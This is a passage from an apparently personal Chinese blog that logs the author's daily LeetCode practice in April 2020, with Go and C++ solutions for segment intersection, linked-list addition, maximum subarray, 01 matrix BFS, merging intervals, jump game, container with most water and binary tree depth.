class="title">calY</span><span class="params">(start []<span class="keyword">int</span>, end []<span class="keyword">int</span>, x <span class="keyword">int</span>)</span> <span class="title">int</span></span> &#123;</span><br><span class="line">	slope := (end[<span class="number">1</span>] - start[<span class="number">1</span>]) / (end[<span class="number">0</span>] - start[<span class="number">0</span>])</span><br><span class="line">	<span class="keyword">return</span> slope*(x-start[<span class="number">0</span>]) + start[<span class="number">1</span>]</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	start1, end1 := []<span class="keyword">int</span>&#123;<span class="number">0</span>, <span class="number">0</span>&#125;, []<span class="keyword">int</span>&#123;<span class="number">1</span>, <span class="number">0</span>&#125;</span><br><span class="line">	start2, end2 := []<span class="keyword">int</span>&#123;<span class="number">1</span>, <span class="number">1</span>&#125;, []<span class="keyword">int</span>&#123;<span class="number">0</span>, <span class="number">-1</span>&#125;</span><br><span class="line">	fmt.Println(intersection(start1, end1, start2, end2))</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<hr>
<p>用数学的做法做，我反正是学不来的，挂个答案记录一下，也没提交反正，慢慢学习</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">intersection</span><span class="params">(start1 []<span class="keyword">int</span>, end1 []<span class="keyword">int</span>, start2 []<span class="keyword">int</span>, end2 []<span class="keyword">int</span>)</span> []<span class="title">float64</span></span> &#123;</span><br><span class="line">    <span class="keyword">const</span> eps = <span class="number">1e-6</span></span><br><span class="line">    sub := <span class="function"><span class="keyword">func</span><span class="params">(a, b []<span class="keyword">int</span>)</span> []<span class="title">int</span></span> &#123;</span><br><span class="line">        c := <span class="built_in">make</span>([]<span class="keyword">int</span>, <span class="number">2</span>)</span><br><span class="line">        c[<span class="number">0</span>] = a[<span class="number">0</span>] - b[<span class="number">0</span>]</span><br><span class="line">        c[<span class="number">1</span>] = a[<span class="number">1</span>] - b[<span class="number">1</span>]</span><br><span class="line">        <span class="keyword">return</span> c</span><br><span class="line">    &#125;</span><br><span class="line">    det := <span class="function"><span class="keyword">func</span><span class="params">(a, b []<span class="keyword">int</span>)</span> <span class="title">int</span></span> &#123; <span class="comment">// 行列式或叉积</span></span><br><span class="line">        <span class="keyword">return</span> a[<span class="number">0</span>]*b[<span class="number">1</span>]-a[<span class="number">1</span>]*b[<span class="number">0</span>]</span><br><span class="line">    &#125;</span><br><span class="line">    inline := <span class="function"><span class="keyword">func</span><span class="params">(s, v, p []<span class="keyword">int</span>)</span> <span class="title">bool</span></span> &#123; <span class="comment">// 检测p是否在线段 p=s+vt 上 (0&lt;=t&lt;=1)</span></span><br><span class="line">        i := <span class="number">0</span></span><br><span class="line">        <span class="keyword">if</span> v[i]==<span class="number">0</span> &#123; i = <span class="number">1</span> &#125;</span><br><span class="line">        t := <span class="keyword">float64</span>((p[i]-s[i])) / <span class="keyword">float64</span>(v[i])</span><br><span class="line">        <span class="keyword">if</span> -eps &lt;= t &amp;&amp; t &lt;= <span class="number">1</span>+eps &#123; <span class="keyword">return</span> <span class="literal">true</span> &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">    &#125;</span><br><span class="line">    v1 := sub(end1, start1)</span><br><span class="line">    v2 := sub(end2, start2)</span><br><span class="line">    b := sub(start2, start1)</span><br><span class="line">    denominator := det(v1, v2)</span><br><span class="line">    ans := []<span class="keyword">float64</span>&#123;&#125;</span><br><span class="line">    <span class="keyword">if</span> denominator == <span class="number">0</span> &#123; <span class="comment">// 平行</span></span><br><span class="line">        <span class="keyword">if</span> det(v1, b) == <span class="number">0</span> &#123; <span class="comment">// 共线</span></span><br><span class="line">            tmp := [][]<span class="keyword">int</span>&#123;start1, end1, start2, end2&#125;</span><br><span class="line">            <span class="comment">// 排序后第二个点为候选点</span></span><br><span class="line">            sort.Slice(tmp, <span class="function"><span class="keyword">func</span><span class="params">(i, j <span class="keyword">int</span>)</span> <span class="title">bool</span></span> &#123;</span><br><span class="line">                <span class="keyword">if</span> tmp[i][<span class="number">0</span>] &lt; tmp[j][<span class="number">0</span>] &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> tmp[i][<span class="number">0</span>]==tmp[j][<span class="number">0</span>] &amp;&amp; tmp[i][<span class="number">1</span>]&lt;tmp[j][<span class="number">1</span>] &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">            &#125;)</span><br><span class="line">            <span class="comment">// 检测是否同时在两线段上</span></span><br><span class="line">            <span class="keyword">if</span> inline(start1, v1, tmp[<span class="number">1</span>]) &amp;&amp; inline(start2, v2, tmp[<span class="number">1</span>]) &#123;</span><br><span class="line">                ans = []<span class="keyword">float64</span>&#123;<span class="keyword">float64</span>(tmp[<span class="number">1</span>][<span class="number">0</span>]), <span class="keyword">float64</span>(tmp[<span class="number">1</span>][<span class="number">1</span>])&#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123; <span class="comment">// 直线相交</span></span><br><span class="line">        t1 := <span class="keyword">float64</span>(det(b, v2)) / <span class="keyword">float64</span>(denominator) <span class="comment">// p=s1+v1*t1 (0&lt;=t1&lt;=1)</span></span><br><span class="line">        t2 := -<span class="keyword">float64</span>(det(v1, b)) / <span class="keyword">float64</span>(denominator)</span><br><span class="line">        <span class="keyword">if</span> <span class="number">0</span>&lt;=t1&amp;&amp;t1&lt;=<span class="number">1</span> &amp;&amp; <span class="number">0</span>&lt;=t2&amp;&amp;t2&lt;=<span class="number">1</span> &#123; <span class="comment">// 交点是否在线段上</span></span><br><span class="line">            ans = []<span class="keyword">float64</span>&#123;<span class="keyword">float64</span>(start1[<span class="number">0</span>])+<span class="keyword">float64</span>(v1[<span class="number">0</span>])*t1, </span><br><span class="line">                        <span class="keyword">float64</span>(start1[<span class="number">1</span>])+<span class="keyword">float64</span>(v1[<span class="number">1</span>])*t1&#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ans</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="2020-4-14"><a href="#2020-4-14" class="headerlink" title="2020/4/14"></a>2020/4/14</h3><h4 id="leetcode-455-两数相加Ⅱ-Go"><a href="#leetcode-455-两数相加Ⅱ-Go" class="headerlink" title="leetcode 455. 两数相加Ⅱ_Go"></a>leetcode 455. 两数相加Ⅱ_Go</h4><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;container/list&quot;</span></span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"> * type ListNode struct &#123;</span></span><br><span class="line"><span class="comment"> *     Val int</span></span><br><span class="line"><span class="comment"> *     Next *ListNode</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ListNode struct</span></span><br><span class="line"><span class="keyword">type</span> ListNode <span class="keyword">struct</span> &#123;</span><br><span class="line">	Val  <span class="keyword">int</span></span><br><span class="line">	Next *ListNode</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 逆序处理要想到栈，关键就是这点</span></span><br><span class="line"><span class="comment">// 之前看了container/list的库，立刻就派上用处了</span></span><br><span class="line"><span class="comment">// 这个我是直接模改的算法笔记上面C++的模板</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">addTwoNumbers</span><span class="params">(l1 *ListNode, l2 *ListNode)</span> *<span class="title">ListNode</span></span> &#123;</span><br><span class="line">	stack1 := list.New()</span><br><span class="line">	stack2 := list.New()</span><br><span class="line">	<span class="keyword">for</span> l1 != <span class="literal">nil</span> &#123;</span><br><span class="line">		stack1.PushFront(l1.Val)</span><br><span class="line">		l1 = l1.Next</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span> l2 != <span class="literal">nil</span> &#123;</span><br><span class="line">		stack2.PushFront(l2.Val)</span><br><span class="line">		l2 = l2.Next</span><br><span class="line">	&#125;</span><br><span class="line">	p := l1</span><br><span class="line">	carry := <span class="number">0</span></span><br><span class="line">	<span class="keyword">for</span> stack1.Len() &gt; <span class="number">0</span> &amp;&amp; stack2.Len() &gt; <span class="number">0</span> &#123;</span><br><span class="line">		val := stack1.Front().Value.(<span class="keyword">int</span>) + stack2.Front().Value.(<span class="keyword">int</span>) + carry</span><br><span class="line">		carry = <span class="number">0</span></span><br><span class="line">		<span class="keyword">if</span> val &gt; <span class="number">9</span> &#123;</span><br><span class="line">			val -= <span class="number">10</span></span><br><span class="line">			carry = <span class="number">1</span></span><br><span class="line">		&#125;</span><br><span class="line">		node := &amp;ListNode&#123;</span><br><span class="line">			Val:  val,</span><br><span class="line">			Next: p,</span><br><span class="line">		&#125;</span><br><span class="line">		p = node</span><br><span class="line">		stack1.Remove(stack1.Front())</span><br><span class="line">		stack2.Remove(stack2.Front())</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span> stack1.Len() &gt; <span class="number">0</span> &#123;</span><br><span class="line">		val := stack1.Front().Value.(<span class="keyword">int</span>) + carry</span><br><span class="line">		carry = <span class="number">0</span></span><br><span class="line">		<span class="keyword">if</span> val &gt; <span class="number">9</span> &#123;</span><br><span class="line">			val -= <span class="number">10</span></span><br><span class="line">			carry = <span class="number">1</span></span><br><span class="line">		&#125;</span><br><span class="line">		node := &amp;ListNode&#123;</span><br><span class="line">			Val:  val,</span><br><span class="line">			Next: p,</span><br><span class="line">		&#125;</span><br><span class="line">		p = node</span><br><span class="line">		stack1.Remove(stack1.Front())</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span> stack2.Len() &gt; <span class="number">0</span> &#123;</span><br><span class="line">		val := stack2.Front().Value.(<span class="keyword">int</span>) + carry</span><br><span class="line">		carry = <span class="number">0</span></span><br><span class="line">		<span class="keyword">if</span> val &gt; <span class="number">9</span> &#123;</span><br><span class="line">			val -= <span class="number">10</span></span><br><span class="line">			carry = <span class="number">1</span></span><br><span class="line">		&#125;</span><br><span class="line">		node := &amp;ListNode&#123;</span><br><span class="line">			Val:  val,</span><br><span class="line">			Next: p,</span><br><span class="line">		&#125;</span><br><span class="line">		p = node</span><br><span class="line">		stack2.Remove(stack2.Front())</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> carry &gt; <span class="number">0</span> &#123;</span><br><span class="line">		node := &amp;ListNode&#123;</span><br><span class="line">			Val:  carry,</span><br><span class="line">			Next: p,</span><br><span class="line">		&#125;</span><br><span class="line">		p = node</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> p</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	l1 := &amp;ListNode&#123;<span class="number">7</span>, <span class="literal">nil</span>&#125;</span><br><span class="line">	l1.Next = <span class="built_in">new</span>(ListNode)</span><br><span class="line">	l1.Next = &amp;ListNode&#123;<span class="number">2</span>, <span class="literal">nil</span>&#125;</span><br><span class="line">	l1.Next.Next = <span class="built_in">new</span>(ListNode)</span><br><span class="line">	l1.Next.Next = &amp;ListNode&#123;<span class="number">4</span>, <span class="literal">nil</span>&#125;</span><br><span class="line">	l1.Next.Next.Next = <span class="built_in">new</span>(ListNode)</span><br><span class="line">	l1.Next.Next.Next = &amp;ListNode&#123;<span class="number">3</span>, <span class="literal">nil</span>&#125;</span><br><span class="line"></span><br><span class="line">	l2 := &amp;ListNode&#123;<span class="number">5</span>, <span class="literal">nil</span>&#125;</span><br><span class="line">	l2.Next = <span class="built_in">new</span>(ListNode)</span><br><span class="line">	l2.Next = &amp;ListNode&#123;<span class="number">6</span>, <span class="literal">nil</span>&#125;</span><br><span class="line">	l2.Next.Next = <span class="built_in">new</span>(ListNode)</span><br><span class="line">	l2.Next.Next = &amp;ListNode&#123;<span class="number">4</span>, <span class="literal">nil</span>&#125;</span><br><span class="line"></span><br><span class="line">	ans := addTwoNumbers(l1, l2)</span><br><span class="line">	<span class="keyword">for</span> ans != <span class="literal">nil</span> &#123;</span><br><span class="line">		fmt.Println(ans.Val, <span class="string">&quot;-&gt;&quot;</span>)</span><br><span class="line">		ans = ans.Next</span><br><span class="line">	&#125;</span><br><span class="line">	fmt.Println(<span class="string">&quot;nil&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="leetcode-53-最大字序和-Go"><a href="#leetcode-53-最大字序和-Go" class="headerlink" title="leetcode 53. 最大字序和_Go"></a>leetcode 53. 最大字序和_Go</h4><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// basic dp</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">maxSubArray</span><span class="params">(nums []<span class="keyword">int</span>)</span> <span class="title">int</span></span> &#123;</span><br><span class="line">	length := <span class="built_in">len</span>(nums)</span><br><span class="line">	dp := <span class="built_in">make</span>([]<span class="keyword">int</span>, length+<span class="number">1</span>)</span><br><span class="line">	ans := nums[<span class="number">0</span>]</span><br><span class="line">	<span class="keyword">for</span> i := <span class="number">1</span>; i &lt; length+<span class="number">1</span>; i++ &#123;</span><br><span class="line">		dp[i] = max(dp[i<span class="number">-1</span>]+nums[i<span class="number">-1</span>], nums[i<span class="number">-1</span>])</span><br><span class="line">		<span class="keyword">if</span> ans &lt; dp[i] &#123;</span><br><span class="line">			ans = dp[i]</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> ans</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">max</span><span class="params">(a, b <span class="keyword">int</span>)</span> <span class="title">int</span></span> &#123;</span><br><span class="line">	<span class="keyword">if</span> a &gt; b &#123;</span><br><span class="line">		<span class="keyword">return</span> a</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> b</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	nums := []<span class="keyword">int</span>&#123;<span class="number">-1</span>&#125;</span><br><span class="line">	fmt.Println(maxSubArray(nums))</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="2020-4-15"><a href="#2020-4-15" class="headerlink" title="2020/4/15"></a>2020/4/15</h3><h4 id="leetcode-542-01矩阵-Go"><a href="#leetcode-542-01矩阵-Go" class="headerlink" title="leetcode 542. 01矩阵_Go"></a>leetcode 542. 01矩阵_Go</h4><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// BFS</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">updateMatrix</span><span class="params">(matrix [][]<span class="keyword">int</span>)</span> [][]<span class="title">int</span></span> &#123;</span><br><span class="line">	wayx := [<span class="number">4</span>]<span class="keyword">int</span>&#123;<span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">-1</span>&#125;</span><br><span class="line">	wayy := [<span class="number">4</span>]<span class="keyword">int</span>&#123;<span class="number">1</span>, <span class="number">-1</span>, <span class="number">0</span>, <span class="number">0</span>&#125;</span><br><span class="line">	queue := [][]<span class="keyword">int</span>&#123;&#125;</span><br><span class="line">	row := <span class="built_in">len</span>(matrix)</span><br><span class="line">	col := <span class="built_in">len</span>(matrix[<span class="number">0</span>])</span><br><span class="line">	<span class="keyword">for</span> i := <span class="number">0</span>; i &lt; row; i++ &#123;</span><br><span class="line">		<span class="keyword">for</span> j := <span class="number">0</span>; j &lt; col; j++ &#123;</span><br><span class="line">			<span class="keyword">if</span> matrix[i][j] == <span class="number">0</span> &#123;</span><br><span class="line">				queue = <span class="built_in">append</span>(queue, []<span class="keyword">int</span>&#123;i, j&#125;)</span><br><span class="line">			&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">				<span class="comment">// 未访问过的1设置为-1</span></span><br><span class="line">				matrix[i][j] = <span class="number">-1</span></span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span> <span class="built_in">len</span>(queue) != <span class="number">0</span> &#123;</span><br><span class="line">		top := queue[<span class="number">0</span>]</span><br><span class="line">		queue = queue[<span class="number">1</span>:]</span><br><span class="line">		x, y := top[<span class="number">0</span>], top[<span class="number">1</span>]</span><br><span class="line">		<span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="number">4</span>; i++ &#123;</span><br><span class="line">			newX := x + wayx[i]</span><br><span class="line">			newY := y + wayy[i]</span><br><span class="line">			<span class="keyword">if</span> newX &gt;= <span class="number">0</span> &amp;&amp; newX &lt; row &amp;&amp; newY &gt;= <span class="number">0</span> &amp;&amp; newY &lt; col &amp;&amp; matrix[newX][newY] == <span class="number">-1</span> &#123;</span><br><span class="line">				matrix[newX][newY] = matrix[x][y] + <span class="number">1</span></span><br><span class="line">				queue = <span class="built_in">append</span>(queue, []<span class="keyword">int</span>&#123;newX, newY&#125;)</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> matrix</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	matrix := [][]<span class="keyword">int</span>&#123;&#123;<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>&#125;,</span><br><span class="line">		&#123;<span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>&#125;,</span><br><span class="line">		&#123;<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>&#125;&#125;</span><br><span class="line">	fmt.Println(updateMatrix(matrix))</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="2020-4-16"><a href="#2020-4-16" class="headerlink" title="2020/4/16"></a>2020/4/16</h3><h4 id="leetcode-52-合并区间-Go"><a href="#leetcode-52-合并区间-Go" class="headerlink" title="leetcode 52. 合并区间_Go"></a>leetcode 52. 合并区间_Go</h4><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">	<span class="string">&quot;sort&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">merge</span><span class="params">(intervals [][]<span class="keyword">int</span>)</span> [][]<span class="title">int</span></span> &#123;</span><br><span class="line">	<span class="keyword">if</span> <span class="built_in">len</span>(intervals) &lt;= <span class="number">0</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// 利用匿名函数排序</span></span><br><span class="line">	sort.Slice(intervals, <span class="function"><span class="keyword">func</span><span class="params">(i, j <span class="keyword">int</span>)</span> <span class="title">bool</span></span> &#123;</span><br><span class="line">		<span class="keyword">return</span> intervals[i][<span class="number">0</span>] &lt; intervals[j][<span class="number">0</span>]</span><br><span class="line">	&#125;)</span><br><span class="line">	ans := [][]<span class="keyword">int</span>&#123;&#125;</span><br><span class="line">	ans = <span class="built_in">append</span>(ans, intervals[<span class="number">0</span>])</span><br><span class="line">	<span class="keyword">for</span> i := <span class="number">1</span>; i &lt; <span class="built_in">len</span>(intervals); i++ &#123;</span><br><span class="line">		right := ans[<span class="built_in">len</span>(ans)<span class="number">-1</span>]</span><br><span class="line">		temp := intervals[i]</span><br><span class="line">		<span class="keyword">if</span> temp[<span class="number">0</span>] &gt; right[<span class="number">1</span>] &#123;</span><br><span class="line">			ans = <span class="built_in">append</span>(ans, temp)</span><br><span class="line">			<span class="keyword">continue</span></span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="keyword">if</span> temp[<span class="number">1</span>] &gt; right[<span class="number">1</span>] &#123;</span><br><span class="line">				right[<span class="number">1</span>] = temp[<span class="number">1</span>]</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> ans</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	intervals := [][]<span class="keyword">int</span>&#123;&#123;<span class="number">1</span>, <span class="number">3</span>&#125;, &#123;<span class="number">2</span>, <span class="number">6</span>&#125;, &#123;<span class="number">8</span>, <span class="number">10</span>&#125;, &#123;<span class="number">15</span>, <span class="number">18</span>&#125;&#125;</span><br><span class="line">	fmt.Println(merge(intervals))</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="2020-4-17"><a href="#2020-4-17" class="headerlink" title="2020/4/17"></a>2020/4/17</h3><h4 id="leetcode-55-跳跃游戏-Go"><a href="#leetcode-55-跳跃游戏-Go" class="headerlink" title="leetcode 55. 跳跃游戏_Go"></a>leetcode 55. 跳跃游戏_Go</h4><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">canJump</span><span class="params">(nums []<span class="keyword">int</span>)</span> <span class="title">bool</span></span> &#123;</span><br><span class="line">	length := <span class="built_in">len</span>(nums)</span><br><span class="line">	max := <span class="number">0</span></span><br><span class="line">	<span class="keyword">if</span> length &lt;= <span class="number">1</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span> i := <span class="number">0</span>; i &lt; length; i++ &#123;</span><br><span class="line">		<span class="comment">// 当前位置可到达</span></span><br><span class="line">		<span class="keyword">if</span> i &lt;= max &#123;</span><br><span class="line">			<span class="keyword">if</span> max &lt; nums[i]+i &#123;</span><br><span class="line">				max = nums[i] + i</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">if</span> max &gt;= length<span class="number">-1</span> &#123;</span><br><span class="line">				<span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	nums := []<span class="keyword">int</span>&#123;<span class="number">3</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">4</span>&#125;</span><br><span class="line">	fmt.Println(canJump(nums))</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="2020-4-18"><a href="#2020-4-18" class="headerlink" title="2020/4/18"></a>2020/4/18</h3><h4 id="leetcode-11-盛水最多的容器-Go"><a href="#leetcode-11-盛水最多的容器-Go" class="headerlink" title="leetcode 11. 盛水最多的容器_Go"></a>leetcode 11. 盛水最多的容器_Go</h4><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 第一个反应就是two pointers</span></span><br><span class="line"><span class="comment">// 从两侧往中间遍历，一次o(n)即可</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">maxArea</span><span class="params">(height []<span class="keyword">int</span>)</span> <span class="title">int</span></span> &#123;</span><br><span class="line">	length := <span class="built_in">len</span>(height)</span><br><span class="line">	left, right := <span class="number">0</span>, length<span class="number">-1</span></span><br><span class="line">	ans := <span class="number">0</span></span><br><span class="line">	<span class="keyword">for</span> left &lt; right &#123;</span><br><span class="line">		tempAns := (right - left) * min(height[left], height[right])</span><br><span class="line">		<span class="keyword">if</span> ans &lt; tempAns &#123;</span><br><span class="line">			ans = tempAns</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> height[left] &lt; height[right] &#123;</span><br><span class="line">			left++</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			right--</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> ans</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">min</span><span class="params">(a, b <span class="keyword">int</span>)</span> <span class="title">int</span></span> &#123;</span><br><span class="line">	<span class="keyword">if</span> a &lt; b &#123;</span><br><span class="line">		<span class="keyword">return</span> a</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> b</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	height := []<span class="keyword">int</span>&#123;<span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">18</span>, <span class="number">17</span>, <span class="number">6</span>&#125;</span><br><span class="line">	fmt.Println(maxArea(height))</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="leetcode-104-二叉树的最大深度-C"><a href="#leetcode-104-二叉树的最大深度-C" class="headerlink" title="leetcode 104. 二叉树的最大深度_C++"></a>leetcode 104. 二叉树的最大深度_C++</h4><p>我们从本地的测试集开始写才是真正的写好一道题哦</p>
<p>不觉得构造一颗树更有收获么，开始重新回忆C++</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;set&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;map&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stack&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;queue&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="comment">// 104. 二叉树的最大深度</span></span><br><span class="line"><span class="comment">// 最大深度用DFS处理每个节点左右子树的深度即可</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">TreeNode</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> val;</span><br><span class="line">    TreeNode *left;</span><br><span class="line">    TreeNode *right;</span><br><span class="line">    <span class="built_in">TreeNode</span>(<span class="keyword">int</span> x) : <span class="built_in">val</span>(x), <span class="built_in">left</span>(<span class="literal">NULL</span>), <span class="built_in">right</span>(<span class="literal">NULL</span>) &#123;&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">maxDepth</span><span class="params">(TreeNode* root)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(root==<span class="literal">NULL</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> leftHeight=<span class="built_in">maxDepth</span>(root-&gt;left);</span><br><span class="line">    <span class="keyword">int</span> rightHeight=<span class="built_in">maxDepth</span>(root-&gt;right);</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">max</span>(leftHeight,rightHeight)+<span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">TreeNode* <span class="title">newNode</span><span class="params">(<span class="keyword">int</span> v)</span></span>&#123;</span><br><span class="line">    